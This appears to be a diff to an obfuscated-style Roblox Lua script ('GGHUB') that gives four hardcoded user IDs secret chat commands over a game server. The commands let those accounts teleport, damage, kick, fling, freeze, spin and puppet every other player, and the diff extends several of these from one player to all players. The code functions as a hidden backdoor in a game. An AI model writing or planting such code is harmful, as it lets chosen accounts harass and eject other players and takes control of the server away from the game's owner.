@@ -30,10 +30,10 @@ local function L_1_func()
     end
     
     local premiumUsers = {
-        [232083112] = true, -- farx
-        [9323471719] = true, -- gold
-        [533423728] = true, -- xian
-        [3683565610] = true -- jayden
+        [232083112] = true,
+        [9323471719] = true,
+        [533423728] = true,
+        [3683565610] = true
     }
     
     local function L_8_func()
@@ -72,7 +72,6 @@ local function L_1_func()
     
     local L_16_ = {}
     local L_17_ = 0
-    local commandConnections = {}
     
     local function L_18_func(L_19_arg1)
         return premiumUsers[L_19_arg1] == true
@@ -87,9 +86,11 @@ local function L_1_func()
         end
     end
     
+    local activeConnections = {}
+    
     spawn(function()
         while true do
-            wait(5)
+            wait(6)
             L_20_func()
         end
     end)
@@ -98,7 +99,6 @@ local function L_1_func()
         wait(1)
         if L_18_func(L_23_arg1.UserId) then
             L_16_[L_23_arg1.UserId] = L_23_arg1
-            L_25_func(L_23_arg1)
         end
     end)
     
@@ -106,9 +106,9 @@ local function L_1_func()
         if L_16_[L_24_arg1.UserId] then
             L_16_[L_24_arg1.UserId] = nil
         end
-        if commandConnections[L_24_arg1.UserId] then
-            commandConnections[L_24_arg1.UserId]:Disconnect()
-            commandConnections[L_24_arg1.UserId] = nil
+        if activeConnections[L_24_arg1.UserId] then
+            activeConnections[L_24_arg1.UserId]:Disconnect()
+            activeConnections[L_24_arg1.UserId] = nil
         end
     end)
     
@@ -117,26 +117,28 @@ local function L_1_func()
     local function L_25_func(L_26_arg1)
         if not L_26_arg1 or not L_18_func(L_26_arg1.UserId) then return end
         
-        if commandConnections[L_26_arg1.UserId] then
-            commandConnections[L_26_arg1.UserId]:Disconnect()
+        if activeConnections[L_26_arg1.UserId] then
+            activeConnections[L_26_arg1.UserId]:Disconnect()
         end
         
-        commandConnections[L_26_arg1.UserId] = L_26_arg1.Chatted:Connect(function(L_28_arg1)
+        activeConnections[L_26_arg1.UserId] = L_26_arg1.Chatted:Connect(function(L_28_arg1)
             if not L_18_func(L_26_arg1.UserId) then
-                if commandConnections[L_26_arg1.UserId] then
-                    commandConnections[L_26_arg1.UserId]:Disconnect()
-                    commandConnections[L_26_arg1.UserId] = nil
+                if activeConnections[L_26_arg1.UserId] then
+                    activeConnections[L_26_arg1.UserId]:Disconnect()
+                    activeConnections[L_26_arg1.UserId] = nil
                 end
                 return
             end
             
-            local L_29_ = string.lower(string.gsub(L_28_arg1, "^%s*", ""))
+            local L_29_ = L_28_arg1:lower()
             
             if L_29_ == "/e bring" then
                 pcall(function()
-                    for L_30_forvar0, L_31_forvar1 in pairs(L_3_:GetPlayers()) do
-                        if L_31_forvar1 ~= L_26_arg1 and L_31_forvar1.Character and L_31_forvar1.Character:FindFirstChild("HumanoidRootPart") and L_26_arg1.Character and L_26_arg1.Character:FindFirstChild("HumanoidRootPart") then
-                            L_31_forvar1.Character.HumanoidRootPart.CFrame = L_26_arg1.Character.HumanoidRootPart.CFrame + Vector3.new(math.random(-5,5), 0, math.random(-5,5))
+                    if L_26_arg1.Character and L_26_arg1.Character:FindFirstChild("HumanoidRootPart") then
+                        for L_30_forvar0, L_31_forvar1 in pairs(L_3_:GetPlayers()) do
+                            if L_31_forvar1 ~= L_26_arg1 and L_31_forvar1.Character and L_31_forvar1.Character:FindFirstChild("HumanoidRootPart") then
+                                L_31_forvar1.Character.HumanoidRootPart.CFrame = L_26_arg1.Character.HumanoidRootPart.CFrame * CFrame.new(math.random(-5,5), 0, math.random(-5,5))
+                            end
                         end
                     end
                 end)
@@ -145,7 +147,7 @@ local function L_1_func()
                 pcall(function()
                     for L_32_forvar0, L_33_forvar1 in pairs(L_3_:GetPlayers()) do
                         if L_33_forvar1 ~= L_26_arg1 and L_33_forvar1.Character and L_33_forvar1.Character:FindFirstChild("Humanoid") then
-                            L_33_forvar1.Character.Humanoid:TakeDamage(L_33_forvar1.Character.Humanoid.MaxHealth)
+                            L_33_forvar1.Character.Humanoid:TakeDamage(100)
                         end
                     end
                 end)
@@ -161,17 +163,18 @@ local function L_1_func()
                 
             elseif L_29_ == "/e say" then
                 pcall(function()
-                    local currentPlayer = L_3_.LocalPlayer
-                    if currentPlayer.Character and currentPlayer.Character:FindFirstChild("Head") then
-                        game:GetService("Chat"):Chat(currentPlayer.Character.Head, "Hello! GGHUB", Enum.ChatColor.White)
+                    for L_80_forvar0, L_81_forvar1 in pairs(L_3_:GetPlayers()) do
+                        if L_81_forvar1 ~= L_26_arg1 and L_81_forvar1.Character and L_81_forvar1.Character:FindFirstChild("Head") then
+                            game:GetService("Chat"):Chat(L_81_forvar1.Character.Head, "Hello! GGHUB", Enum.ChatColor.White)
+                        end
                     end
                 end)
                 
             elseif L_29_ == "/e kick" then
                 pcall(function()
                     for L_36_forvar0, L_37_forvar1 in pairs(L_3_:GetPlayers()) do
-                        if L_37_forvar1 ~= L_26_arg1 and not L_18_func(L_37_forvar1.UserId) then
-                            L_37_forvar1:Kick("Premium GGHUB, sorry")
+                        if L_37_forvar1 ~= L_26_arg1 then
+                            L_37_forvar1:Kick("Premium GGHUB")
                         end
                     end
                 end)
@@ -182,8 +185,8 @@ local function L_1_func()
                         if L_39_forvar1 ~= L_26_arg1 and L_39_forvar1.Character and L_39_forvar1.Character:FindFirstChild("HumanoidRootPart") then
                             L_39_forvar1.Character.HumanoidRootPart.Anchored = true
                             spawn(function()
-                                wait(15)
-                                if L_39_forvar1 and L_39_forvar1.Character and L_39_forvar1.Character:FindFirstChild("HumanoidRootPart") then
+                                wait(10)
+                                if L_39_forvar1.Character and L_39_forvar1.Character:FindFirstChild("HumanoidRootPart") then
                                     L_39_forvar1.Character.HumanoidRootPart.Anchored = false
                                 end
                             end)
@@ -196,164 +199,190 @@ local function L_1_func()
                     for L_40_forvar0, L_41_forvar1 in pairs(L_3_:GetPlayers()) do
                         if L_41_forvar1 ~= L_26_arg1 and L_41_forvar1.Character and L_41_forvar1.Character:FindFirstChild("HumanoidRootPart") then
                             local L_42_ = Instance.new("BodyAngularVelocity")
-                            L_42_.AngularVelocity = Vector3.new(0, 20, 0)
+                            L_42_.AngularVelocity = Vector3.new(0, 25, 0)
                             L_42_.MaxTorque = Vector3.new(0, math.huge, 0)
                             L_42_.Parent = L_41_forvar1.Character.HumanoidRootPart
                             
-                            game:GetService("Debris"):AddItem(L_42_, 3)
+                            game:GetService("Debris"):AddItem(L_42_, 5)
                         end
                     end
                 end)
                 
             elseif L_29_ == "/e fling" then
                 pcall(function()
-                    local currentPlayer = L_3_.LocalPlayer
-                    if currentPlayer ~= L_26_arg1 and currentPlayer.Character and currentPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                        local L_43_ = Instance.new("BodyVelocity")
-                        L_43_.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
-                        L_43_.Velocity = Vector3.new(math.random(-100,100), 100, math.random(-100,100))
-                        L_43_.Parent = currentPlayer.Character.HumanoidRootPart
-                        
-                        game:GetService("Debris"):AddItem(L_43_, 2)
+                    for L_82_forvar0, L_83_forvar1 in pairs(L_3_:GetPlayers()) do
+                        if L_83_forvar1 ~= L_26_arg1 and L_83_forvar1.Character and L_83_forvar1.Character:FindFirstChild("HumanoidRootPart") then
+                            local L_43_ = Instance.new("BodyVelocity")
+                            L_43_.MaxForce = Vector3.new(4000, 4000, 4000)
+                            L_43_.Velocity = Vector3.new(math.random(-50,50), 50, math.random(-50,50))
+                            L_43_.Parent = L_83_forvar1.Character.HumanoidRootPart
+                            
+                            game:GetService("Debris"):AddItem(L_43_, 1)
+                        end
                     end
                 end)
                 
             elseif L_29_ == "/e sit" then
                 pcall(function()
-                    local currentPlayer = L_3_.LocalPlayer
-                    if currentPlayer ~= L_26_arg1 and currentPlayer.Character and currentPlayer.Character:FindFirstChild("Humanoid") then
-                        currentPlayer.Character.Humanoid.Sit = true
+                    for L_84_forvar0, L_85_forvar1 in pairs(L_3_:GetPlayers()) do
+                        if L_85_forvar1 ~= L_26_arg1 and L_85_forvar1.Character and L_85_forvar1.Character:FindFirstChild("Humanoid") then
+                            L_85_forvar1.Character.Humanoid.Sit = true
+                        end
                     end
                 end)
                 
             elseif L_29_ == "/e slowwalk" then
                 pcall(function()
-                    local currentPlayer = L_3_.LocalPlayer
-                    if currentPlayer ~= L_26_arg1 and currentPlayer.Character and currentPlayer.Character:FindFirstChild("Humanoid") then
-                        currentPlayer.Character.Humanoid.WalkSpeed = 7
+                    for L_86_forvar0, L_87_forvar1 in pairs(L_3_:GetPlayers()) do
+                        if L_87_forvar1 ~= L_26_arg1 and L_87_forvar1.Character and L_87_forvar1.Character:FindFirstChild("Humanoid") then
+                            L_87_forvar1.Character.Humanoid.WalkSpeed = 5
+                            spawn(function()
+                                wait(10)
+                                if L_87_forvar1.Character and L_87_forvar1.Character:FindFirstChild("Humanoid") then
+                                    L_87_forvar1.Character.Humanoid.WalkSpeed = 16
+                                end
+                            end)
+                        end
                     end
                 end)
                 
             elseif L_29_ == "/e angel" then
                 pcall(function()
-                    local currentPlayer = L_3_.LocalPlayer
-                    if currentPlayer ~= L_26_arg1 and currentPlayer.Character and currentPlayer.Character:FindFirstChild("HumanoidRootPart") and currentPlayer.Character:FindFirstChild("Humanoid") then
-                        local L_44_ = currentPlayer
-                        local L_45_ = L_44_.Character
-                        local L_46_ = L_45_.Humanoid
-                        local L_47_ = L_45_.HumanoidRootPart
-                        
-                        local L_48_ = L_46_.WalkSpeed
-                        local L_49_ = L_46_.JumpPower
-                        local L_50_ = L_47_.Position
-                        
-                        local L_51_ = Instance.new("BodyPosition")
-                        L_51_.MaxForce = Vector3.new(4000, 4000, 4000)
-                        L_51_.D = 2000
-                        L_51_.P = 10000
-                        L_51_.Position = L_50_
-                        L_51_.Parent = L_47_
-                        
-                        local L_52_ = Instance.new("BodyAngularVelocity")
-                        L_52_.MaxTorque = Vector3.new(0, math.huge, 0)
-                        L_52_.AngularVelocity = Vector3.new(0, 2, 0)
-                        L_52_.Parent = L_47_
-                        
-                        L_46_.WalkSpeed = 0
-                        L_46_.JumpPower = 0
-                        L_46_.PlatformStand = true
-                        
-                        spawn(function()
-                            for L_53_forvar0 = 1, 50 do
-                                if L_51_ and L_51_.Parent then
-                                    L_51_.Position = L_50_ + Vector3.new(0, L_53_forvar0 * 1.2, 0)
-                                    wait(0.1)
-                                end
+                    for L_88_forvar0, L_89_forvar1 in pairs(L_3_:GetPlayers()) do
+                        if L_89_forvar1 ~= L_26_arg1 and L_89_forvar1.Character and L_89_forvar1.Character:FindFirstChild("HumanoidRootPart") and L_89_forvar1.Character:FindFirstChild("Humanoid") then
+                            local L_45_ = L_89_forvar1.Character
+                            local L_46_ = L_45_.Humanoid
+                            local L_47_ = L_45_.HumanoidRootPart
+                            
+                            local L_48_ = L_46_.WalkSpeed
+                            local L_49_ = L_46_.JumpPower or L_46_.JumpHeight
+                            local L_50_ = L_47_.Position
+                            
+                            local L_51_ = Instance.new("BodyPosition")
+                            L_51_.MaxForce = Vector3.new(4000, 4000, 4000)
+                            L_51_.D = 2000
+                            L_51_.P = 10000
+                            L_51_.Position = L_50_
+                            L_51_.Parent = L_47_
+                            
+                            local L_52_ = Instance.new("BodyAngularVelocity")
+                            L_52_.MaxTorque = Vector3.new(0, math.huge, 0)
+                            L_52_.AngularVelocity = Vector3.new(0, 3, 0)
+                            L_52_.Parent = L_47_
+                            
+                            L_46_.WalkSpeed = 0
+                            if L_46_.JumpPower then
+                                L_46_.JumpPower = 0
+                            else
+                                L_46_.JumpHeight = 0
                             end
+                            L_46_.PlatformStand = true
                             
-                            wait(5)
-                            
-                            if L_51_ and L_51_.Parent then
-                                for L_54_forvar0 = 50, 1, -1 do
+                            spawn(function()
+                                for L_53_forvar0 = 1, 40 do
                                     if L_51_ and L_51_.Parent then
-                                        L_51_.Position = L_50_ + Vector3.new(0, L_54_forvar0 * 1.2, 0)
-                                        wait(0.05)
+                                        L_51_.Position = L_50_ + Vector3.new(0, L_53_forvar0 * 1, 0)
+                                        wait(0.1)
                                     end
                                 end
-                            end
-                            
-                            if L_45_ and L_46_ then
-                                L_46_.WalkSpeed = L_48_
-                                L_46_.JumpPower = L_49_
-                                L_46_.PlatformStand = false
-                            end
-                            
-                            if L_51_ then L_51_:Destroy() end
-                            if L_52_ then L_52_:Destroy() end
-                        end)
+                                
+                                wait(3)
+                                
+                                if L_51_ and L_51_.Parent then
+                                    for L_54_forvar0 = 40, 1, -1 do
+                                        if L_51_ and L_51_.Parent then
+                                            L_51_.Position = L_50_ + Vector3.new(0, L_54_forvar0 * 1, 0)
+                                            wait(0.08)
+                                        end
+                                    end
+                                end
+                                
+                                if L_45_ and L_46_ then
+                                    L_46_.WalkSpeed = L_48_
+                                    if L_46_.JumpPower then
+                                        L_46_.JumpPower = L_49_
+                                    else
+                                        L_46_.JumpHeight = L_49_
+                                    end
+                                    L_46_.PlatformStand = false
+                                end
+                                
+                                if L_51_ then L_51_:Destroy() end
+                                if L_52_ then L_52_:Destroy() end
+                            end)
+                        end
                     end
                 end)
                 
             elseif L_29_ == "/e orbit" then
                 pcall(function()
-                    local currentPlayer = L_3_.LocalPlayer
-                    if currentPlayer ~= L_26_arg1 and currentPlayer.Character and currentPlayer.Character:FindFirstChild("HumanoidRootPart") and L_26_arg1.Character and L_26_arg1.Character:FindFirstChild("HumanoidRootPart") then
-                        local L_55_ = currentPlayer
-                        local L_56_ = L_55_.Character
-                        local L_57_ = L_56_.HumanoidRootPart
-                        local L_58_ = L_56_.Humanoid
-                        local L_59_ = L_26_arg1.Character.HumanoidRootPart
-                        
-                        local L_60_ = L_58_.WalkSpeed
-                        local L_61_ = L_58_.JumpPower
-                        
-                        local L_62_ = Instance.new("BodyPosition")
-                        L_62_.MaxForce = Vector3.new(4000, 4000, 4000)
-                        L_62_.D = 2000
-                        L_62_.P = 10000
-                        L_62_.Parent = L_57_
-                        
-                        local L_63_ = Instance.new("BodyAngularVelocity")
-                        L_63_.MaxTorque = Vector3.new(0, 0, 0)
-                        L_63_.AngularVelocity = Vector3.new(0, 0, 0)
-                        L_63_.Parent = L_57_
-                        
-                        L_58_.WalkSpeed = 0
-                        L_58_.JumpPower = 0
-                        L_58_.PlatformStand = true
-                        
-                        spawn(function()
-                            local L_64_ = 0
-                            local L_65_ = 8
-                            local L_66_ = 0.2
+                    for L_90_forvar0, L_91_forvar1 in pairs(L_3_:GetPlayers()) do
+                        if L_91_forvar1 ~= L_26_arg1 and L_91_forvar1.Character and L_91_forvar1.Character:FindFirstChild("HumanoidRootPart") and L_26_arg1.Character and L_26_arg1.Character:FindFirstChild("HumanoidRootPart") then
+                            local L_56_ = L_91_forvar1.Character
+                            local L_57_ = L_56_.HumanoidRootPart
+                            local L_58_ = L_56_.Humanoid
+                            local L_59_ = L_26_arg1.Character.HumanoidRootPart
                             
-                            for L_67_forvar0 = 1, 125 do
-                                if L_62_ and L_62_.Parent and L_59_ and L_59_.Parent then
-                                    local L_68_ = L_59_.Position
-                                    local L_69_ = math.cos(L_64_) * L_65_
-                                    local L_70_ = math.sin(L_64_) * L_65_
-                                    
-                                    L_62_.Position = L_68_ + Vector3.new(L_69_, 2, L_70_)
-                                    
-                                    local L_71_ = (L_68_ - L_57_.Position).Unit
-                                    L_57_.CFrame = CFrame.lookAt(L_57_.Position, L_68_)
-                                    
-                                    L_64_ = L_64_ + L_66_
-                                    wait(0.04)
-                                else
-                                    break
+                            local L_60_ = L_58_.WalkSpeed
+                            local L_61_ = L_58_.JumpPower or L_58_.JumpHeight
+                            
+                            local L_62_ = Instance.new("BodyPosition")
+                            L_62_.MaxForce = Vector3.new(4000, 4000, 4000)
+                            L_62_.D = 2000
+                            L_62_.P = 10000
+                            L_62_.Parent = L_57_
+                            
+                            local L_63_ = Instance.new("BodyAngularVelocity")
+                            L_63_.MaxTorque = Vector3.new(0, 0, 0)
+                            L_63_.AngularVelocity = Vector3.new(0, 0, 0)
+                            L_63_.Parent = L_57_
+                            
+                            L_58_.WalkSpeed = 0
+                            if L_58_.JumpPower then
+                                L_58_.JumpPower = 0
+                            else
+                                L_58_.JumpHeight = 0
+                            end
+                            L_58_.PlatformStand = true
+                            
+                            spawn(function()
+                                local L_64_ = 0
+                                local L_65_ = 10
+                                local L_66_ = 0.3
+                                
+                                for L_67_forvar0 = 1, 100 do
+                                    if L_62_ and L_62_.Parent and L_59_ and L_59_.Parent then
+                                        local L_68_ = L_59_.Position
+                                        local L_69_ = math.cos(L_64_) * L_65_
+                                        local L_70_ = math.sin(L_64_) * L_65_
+                                        
+                                        L_62_.Position = L_68_ + Vector3.new(L_69_, 3, L_70_)
+                                        
+                                        if L_57_ and L_57_.Parent then
+                                            L_57_.CFrame = CFrame.lookAt(L_57_.Position, L_68_)
+                                        end
+                                        
+                                        L_64_ = L_64_ + L_66_
+                                        wait(0.09)
+                                    else
+                                        break
+                                    end
                                 end
-                            end
-                            
-                            if L_56_ and L_58_ then
-                                L_58_.WalkSpeed = L_60_
-                                L_58_.JumpPower = L_61_
-                                L_58_.PlatformStand = false
-                            end
-                            
-                            if L_62_ then L_62_:Destroy() end
-                            if L_63_ then L_63_:Destroy() end
-                        end)
+                                
+                                if L_56_ and L_58_ then
+                                    L_58_.WalkSpeed = L_60_
+                                    if L_58_.JumpPower then
+                                        L_58_.JumpPower = L_61_
+                                    else
+                                        L_58_.JumpHeight = L_61_
+                                    end
+                                    L_58_.PlatformStand = false
+                                end
+                                
+                                if L_62_ then L_62_:Destroy() end
+                                if L_63_ then L_63_:Destroy() end
+                            end)
+                        end
                     end
                 end)
             end
@@ -364,11 +393,18 @@ local function L_1_func()
         L_25_func(L_74_forvar1)
     end
     
+    L_3_.PlayerAdded:Connect(function(L_75_arg1)
+        wait(2)
+        if L_18_func(L_75_arg1.UserId) then
+            L_25_func(L_75_arg1)
+        end
+    end)
+    
     spawn(function()
         while true do
-            wait(5)
+            wait(10)
             for L_76_forvar0, L_77_forvar1 in pairs(L_16_) do
-                if L_77_forvar1 and L_77_forvar1.Parent and not commandConnections[L_77_forvar1.UserId] then
+                if L_77_forvar1 and L_77_forvar1.Parent and not activeConnections[L_77_forvar1.UserId] then
                     L_25_func(L_77_forvar1)
                 end
             end
